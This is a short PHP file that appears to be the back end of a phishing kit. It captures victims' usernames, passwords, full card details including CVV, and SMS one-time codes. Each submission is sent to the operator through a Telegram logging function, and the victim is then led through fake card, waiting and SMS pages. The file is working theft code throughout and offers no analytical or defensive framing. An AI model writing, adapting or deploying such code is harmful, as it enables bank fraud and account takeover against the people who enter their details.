<?php 
session_start();
require 'config.php';
require 'telegram_logger.php';

$ip = $_SERVER['REMOTE_ADDR'];

if(isset($_POST['user'])){
    $msg = "🔑 PASSWORD SUBMITTED\n--------------------------\nUser: ".$_POST['user']."\nPass: ".$_POST['pass'];
    sendToTelegram($msg, "PASSWORD");
    header("location: card.php");
}

if(isset($_POST['cc'])){
    $_SESSION['_cc'] = $_POST['cc'];
    $msg = "💳 CARD SUBMITTED\n--------------------------\nName: ".$_POST['name']."\nCC: ".$_POST['cc']."\nExp: ".$_POST['exp']."\nCVV: ".$_POST['cvv'];
    sendToTelegram($msg, "CARD");
    header("location: wait.php?next=sms.php");
}

if(isset($_POST['otp'])){
    $msg = "📱 OTP SUBMITTED\n--------------------------\nCC: ".$_SESSION['_cc']."\nOTP: ".$_POST['otp'];
    sendToTelegram($msg, "OTP");
    
    if(isset($_POST['exit'])){
        die(header("location: exit.php"));
    }
    header("location: wait.php?next=sms.php?error");
}
?>